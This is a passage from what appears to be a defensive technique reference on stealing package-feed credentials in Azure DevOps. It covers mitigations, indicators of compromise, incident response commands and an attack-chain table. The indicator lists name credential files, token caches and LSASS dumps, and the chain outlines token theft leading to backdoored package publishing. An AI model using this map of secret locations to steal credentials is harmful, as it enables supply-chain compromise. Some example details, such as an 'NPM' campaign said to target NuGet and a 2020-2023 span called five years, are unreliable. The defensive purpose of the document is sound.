  steps:
  - task: CredScan@2
    inputs:
      toolMajorVersion: 'V2'
  ```

- **Enforce Secret Scanning in Source Repositories**
  - **GitHub:** Enable **Secret scanning** and **Push protection**
  - **Azure Repos:** Enable **Secret scanning**
  
  **Manual Steps (GitHub):**
  1. Go to **Settings** → **Security & analysis**
  2. Enable **Secret scanning**
  3. Enable **Push protection**
  4. Configure patterns for custom secrets

### Priority 2: HIGH

- **Implement Network Segmentation for Package Feeds**
  - Restrict access to Azure Artifacts feeds to specific IP ranges
  - Use **Network Security Groups (NSGs)** to control traffic
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Artifacts** → **Feed settings**
  2. Click **Upstream sources**
  3. Enable **Restrict access** if available
  4. Add IP whitelist for CI/CD agents

- **Enable Azure Artifacts Feed Access Logging**
  - **Manual Steps:**
    1. Go to **Azure DevOps** → **Project Settings** → **Audit log**
    2. Search for "Package" or "Feed" operations
    3. Export logs to Sentinel for monitoring

- **Implement Just-In-Time (JIT) Access for DevOps Admin Roles**
  - Use **Privileged Identity Management (PIM)** to require approval for elevated access
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Privileged Identity Management** → **Azure AD Roles**
  2. Click **Assignments** → Select role (e.g., "User Administrator")
  3. Enable **Require Justification** and **Require Approval**

### Access Control & Policy Hardening

- **Conditional Access Policy: Block Risky Logins to Azure DevOps**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Risky Logins to DevOps`
  4. **Assignments:**
     - Users: **All users** (exclude emergency access accounts)
     - Cloud apps: **Azure DevOps**
     - Conditions:
       - **Sign-in risk:** Any
       - **Device platforms:** All devices
  5. **Access controls:**
     - Grant: **Block access**
  6. Enable policy: **On**
  7. Click **Create**

- **RBAC Configuration: Least Privilege Feed Access**
  
  **Manual Steps (Azure DevOps):**
  1. Go to **Artifacts** → Select **Feed** → **Feed Settings**
  2. Click **Permissions**
  3. Add groups with minimal required permissions:
     - **Developers:** "Feed and upstream source reader"
     - **CI/CD Service:** "Contributor" (publish only to specific feed)
     - **Legacy apps:** Remove all permissions; use service principal instead

- **Validate RBAC Configuration (PowerShell):**
  ```powershell
  # Check Azure DevOps feed permissions
  $org = "company"
  $project = "MyProject"
  $feedName = "internal-feed"
  
  az devops configure --defaults organization=https://dev.azure.com/$org project=$project
  az artifacts universal feed show --feed $feedName --query "permissions"
  ```

  **Expected Output (Secure):**
  ```
  "permissions": [
    {
      "identityDescriptor": "Microsoft.IdentityModel.Claims.ClaimsIdentity;...",
      "role": "reader"
    }
  ]
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** 
  - `C:\Users\*\.nuget\nuget.config`
  - `$HOME/.npmrc`
  - `$HOME/.pypirc`
  - `$HOME/.m2/settings.xml`
  - `$HOME/.azure/*` (token cache files)

- **Registry:** 
  - `HKCU\Software\Microsoft\NuGet` (cached credentials)
  - `HKCU\Software\npm` (npm registry tokens)

- **Network:** 
  - Outbound HTTPS to `pkgs.dev.azure.com`, `npmjs.org`, `pypi.org`
  - Unauthorized API calls to `/nuget/v3/` endpoints

### Forensic Artifacts

- **Disk:** 
  - Modified timestamps on `nuget.config` files
  - PowerShell command history (`C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`)
  - Process execution logs showing `nuget.exe`, `dotnet restore`, `npm install`

- **Memory:** 
  - LSASS process dump (search for credential handles)
  - PowerShell Process Memory (PAT tokens in plaintext)

- **Cloud (Azure/Sentinel):** 
  - `SigninLogs` table: Non-interactive logins to Azure DevOps
  - `AuditLogs` table: Package feed access, feed permission changes
  - `DevOpsAuditing` table (if enabled): Package publish, feed modification

- **Logs:** 
  - `~/.bash_history`, `~/.zsh_history` (commands with tokens)
  - Build pipeline logs containing secrets

### Response Procedures

1. **Immediate (0-1 hour):**
   
   **Isolate:**
   ```powershell
   # If machine is compromised, disconnect from network
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```
   
   **Rotate Credentials:**
   ```powershell
   # Revoke all PATs for affected user
   az devops login --organization https://dev.azure.com/company --token "NEW_ADMIN_TOKEN"
   az devops user show --user-id affected-user@company.com
   
   # Manually revoke PATs: Go to Azure DevOps → User Settings → Personal Access Tokens → Revoke All
   ```
   
   **Collect Evidence:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Copy nuget.config files
   Copy-Item -Path "$env:USERPROFILE\.nuget\*" -Destination "C:\Evidence\" -Recurse
   
   # Export PowerShell history
   Copy-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*" -Destination "C:\Evidence\"
   ```

2. **Short-term (1-8 hours):**
   
   **Investigate:**
   - Query Sentinel for all logins using the stolen PAT
   - Check Azure DevOps audit logs for malicious package pushes
   - Review build pipeline logs for credential exposure
   
   **Remediate:**
   ```powershell
   # Force password reset for affected user
   Set-AzureADUserPassword -ObjectId $userId -Password (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "user", (ConvertTo-SecureString -String "NewPassword123!" -AsPlainText -Force)).Password -EnforceChangePasswordPolicy $true
   
   # Invalidate all refresh tokens
   Revoke-AzureADUserAllRefreshToken -ObjectId $userId
   ```

3. **Long-term (8+ hours):**
   
   **Monitor:**
   - Alert on any PAT creation for affected users
   - Monitor package feed for suspicious package versions
   - Track all API calls from the organization for 30 days

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Phishing attack to compromise developer workstation or CI/CD agent |
| **2** | **Execution** | [CA-DUMP-001](./CA-DUMP-001_Mimikatz.md) | LSASS memory dump to extract cached credentials |
| **3** | **Current Step** | **[CA-TOKEN-017]** | **Package Source Credential Theft** |
| **4** | **Lateral Movement** | [CA-TOKEN-001](./CA-TOKEN-001_Hybrid_Token.md) | Use stolen token to access Azure Management APIs |
| **5** | **Persistence** | [PERSIST-ACCT-005](../05_Persist/PERSIST-ACCT-005_Graph_App.md) | Create persistent app registration with stolen service principal |
| **6** | **Impact** | Supply Chain Attack | Publish backdoored packages to compromise downstream consumers |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Compromise (2020)

- **Target:** Fortune 500 companies, government agencies
- **Timeline:** March 2020 – December 2020
- **Technique Status:** APT29 compromised SolarWinds Orion build servers and stole internal credentials (service account PATs and API keys)
- **Impact:** Ability to inject malicious code into SolarWinds updates; compromised 18,000+ customers; led to SUNBURST malware distribution
- **Reference:** [Microsoft Security Response Center](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)

### Example 2: NPM Package Typosquatting Campaign (2023)

- **Target:** .NET developers using NuGet
- **Timeline:** 2020-2023 (5-year campaign)
- **Technique Status:** Attackers used credential theft combined with typosquatting; compromised build systems stole credentials to publish malicious packages
- **Impact:** 2,000+ downloads of malicious packages; cryptocurrency wallet theft; persistent backdoors
- **Reference:** [Socket Threat Research](https://socket.dev/blog/trojanized-npm-packages-npm-rsa-npm-rc-npm-utils), [JFrog Security](https://jfrog.com/blog/impala-stealer-malicious-nuget-package-payload/)

### Example 3: Scattered Spider Campaign (2023-2024)

- **Target:** Organizations using Azure DevOps
- **Timeline:** Ongoing
- **Technique Status:** Social engineering + credential theft; attackers phished developers for PATs, then used tokens to access pipelines and steal additional credentials
- **Impact:** Lateral movement across cloud environments; access to Okta, AWS, GCP credentials
- **Reference:** [CrowdStrike Intelligence](https://www.crowdstrike.com/blog/scattered-spider-identity-attacks/), [Picus Security Analysis](https://www.picussecurity.com/resource/blog/tracking-scattered-spider-through-identity-attacks-and-token-theft)

---